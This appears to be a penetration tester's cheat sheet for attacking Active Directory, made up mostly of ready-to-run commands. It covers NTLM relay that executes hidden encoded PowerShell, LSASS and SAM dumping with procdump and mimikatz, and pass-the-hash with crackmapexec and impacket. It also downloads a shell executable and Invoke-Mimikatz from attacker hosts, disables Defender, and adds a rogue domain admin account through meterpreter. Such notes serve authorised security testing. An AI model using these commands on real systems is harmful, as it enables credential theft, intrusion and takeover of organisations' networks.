# Active Directory

## NTLM Relay Attack

```
cme --timeout 5 --verbose smb 172.0.0.1/24 --gen-relay-list targets.txt
```

```
python RunFinger.py -g -i 172.0.0.1/24
```

```
python Responder.py -I <interface> -r -d -w
```

```
echo "powershell_command_string" | iconv --to-code UTF-16LE | base64 -w 0
```

```
ntlmrelayx.py -tf targets.txt -c 'powershell.exe -NoP -sta -NonI -W Hidden -Enc {base64_code}'
```

```
ntlmrelayx.py -tf targets.txt -c <Empire Powershell launcher>
```

## Check Password Policy on Network Domain

* [https://www.wikigain.com/configuring-password-policies-with-windows-server-2016/](https://www.wikigain.com/configuring-password-policies-with-windows-server-2016/)

```
gpedit.msc
```

Now go to `Computer Configuration/Windows Settings/Security Settings/Password Policy`

## Dump LSASS

* [https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf](https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330)

```
C:\\temp\\procdump.exe -accepteula  -ma lsass.exe lsass.dmp
#For 32 bits


C:\\temp\\procdump.exe -accepteula -64 -ma lsass.exe  lsass.dmp  
#For 64 bits
```

Download the file lsass.dmp generated.Launch mimikatz against the lsass.dmp file with the commands:

```
mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP

mimikatz # sekurlsa::logonPasswords full



# use with -r to clone and then dump LSASS
procdump -accepteula -r -ma lsass.exe lsass.dmp
```

## Dumping SAM

### Dump Sam File

```
crackmapexec smb 10.0.0.75 -d ADMIN -u JSMITH -p 'P@ssWord!' --sam
```

### Check for Local Account Credential Reuse with SAM file hash

```
crackmapexec smb /root/Desktop/networks.txt -d WORKGROUP -u Administrator -H <LM:NTLM HASH>
```

## Network Share Auditing

* [https://github.com/Dionach/ShareAudit/blob/master/README.md](https://github.com/Dionach/ShareAudit/blob/master/README.md)

## Impacket Tools

### WMIEXEC

```
./wmiexec.py -hashes <NTLM Hash> Administrator@10.0.4.21
```

### Secrets Dump

```
impacket-secretsdump -hashes <LTM:NTLM Hash> -just-dc insecuredomain.local/Administrator\$@10.0.64.22
```

### SMBEXEC

```
/usr/local/bin/smbexec.py -hashes <LM:NTLM Hash> Administrator@10.0.65.81
```

## PowerShell Execution Policy Disable:

```
powershell.exe -exec bypass -nop
```

## Bitsadmin

```
bitsadmin /transfer myDownloadJob /download /priority normal http://10.0.65.37:8000/shell1.exe c:\shell1.exe
```

## Bits Transfer (Power Shell)

[https://adamtheautomator.com/powershell-download-file/](https://adamtheautomator.com/powershell-download-file/)

The fundamental way to use `Start-BitsTransfer` in PowerShell to download a file is to specify a source and destination. Using the script below, you only need to change the `$source` and `$destination` values according to your requirements.

```powershell
$source = 'http://speedtest.tele2.net/100MB.zip'
$destination = 'c:\dload\100MB.zip'
Start-BitsTransfer -Source $source -Destination $destination
```

### Downloading a File using System.Net.WebClient <a href="#h-downloading-a-file-using-system-net-webclient" id="h-downloading-a-file-using-system-net-webclient"></a>

To use the WebClient class, you need to initiate an object as a `System.Net.WebClient` \*\*type. In the example below, the `$webClient` is the new `System.Net.WebClient` object. Then, using the `DownloadFile()` method starts the download of the file from the source.

_**Related:**_ [_**Using PowerShell Data Types Accelerators to Speed up Coding**_](https://adamtheautomator.com/powershell-data-types/)

Please copy the code below and run it in your PowerShell session to test. Note that you will not see any progress or output on the screen unless there’s an error. However, the PowerShell prompt will be locked until the download is complete.

```powershell
# Define the source link and destination path
$source = 'http://speedtest.tele2.net/10MB.zip'
$destination = 'c:\dload\10MB.zip'
# Create the new WebClient
$webClient = [System.Net.WebClient]::new()
# Download the file
$webClient.DownloadFile($source, $destination)
```

## Python Web Server

```
python –m SimpleHTTPServer
```

## Escalation to Domain Admin

### After compromising a Windows machine:

### List the domain administrators from a command prompt:

```
net group "Domain Admins" /domain
```

### Dump the hashes (Metasploit)

```
msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE
```

### Find the admins (Metasploit)

```
spool /tmp/enumdomainusers.txt
msf > use auxiliary/scanner/smb/smb_enumusers_domain
msf > set smbuser Administrator
msf > set smbpass <LM:NTLM Hash>
msf > set rhosts 10.0.0.0/24
msf > set threads 8
msf > run
msf> spool off
```

### Compromise Admin's box

```
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token MYDOMAIN\\\\adaministrator
meterpreter > getuid
meterpreter > shell
```

```
C:\\> whoami
mydom\\adaministrator
C:\\> net user hacker /add /domain
C:\\> net group "Domain Admins" hacker /add /domain
```

## Credentials Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
```

**Find other things that Mimikatz can do in** [**this page**](broken-reference)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
```

{% code title="attacker@victim" %}
```csharp
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```
{% endcode %}

## Empty Recycle Bin PowerShell

#### Clear all recycle bins <a href="#1--clear-all-recycle-bins" id="1--clear-all-recycle-bins"></a>

```
Clear-RecycleBin
```

## Extracting Zipped Archives with PowerShell

```
Expand-Archive -Path E:\DSC.zip -DestinationPath E:\Extract -Verbose
```

## Disable Reatime Monitoring (Defender)

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

## New PSSession on a Remote Machine:

****[**https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.2**](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.2)****

```
$sess = New-PSSession -ComputerName machine.domain.corp
```

#### Enter the Session created:

```
Enter-PSSession -Session $sess
```

## ConvertTo-SecureString Error [![RRS feed](https://i1.social.s-msft.com/globalresources/Images/trans.gif?cver=0001)](https://social.technet.microsoft.com/Forums/en-US/winserverpowershell/thread/76dfebb8-1376-4b12-a740-02c04ef73884?outputAs=rss)

```
$secpasswd = ConvertTO-SecureString $textFromFile -asplaintext -Force
```

## References:

* [https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons#interactive-logon-2-via-runas-and-domain-account](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons#interactive-logon-2-via-runas-and-domain-account)
* [https://www.bleepingcomputer.com/news/microsoft/microsoft-defender-can-ironically-be-used-to-download-malware/](https://www.bleepingcomputer.com/news/microsoft/microsoft-defender-can-ironically-be-used-to-download-malware/)
* [https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330](https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330)
* [https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/](https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/)
* [https://wiki.wizard32.net/xwiki/bin/view/Penetration Testing\_Red Teaming/NTLM Relay Attack/](https://wiki.wizard32.net/xwiki/bin/view/Penetration%20Testing\_Red%20Teaming/NTLM%20Relay%20Attack/)
* h[ttps://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
* [https://www.varonis.com/blog/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/](https://www.varonis.com/blog/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/)

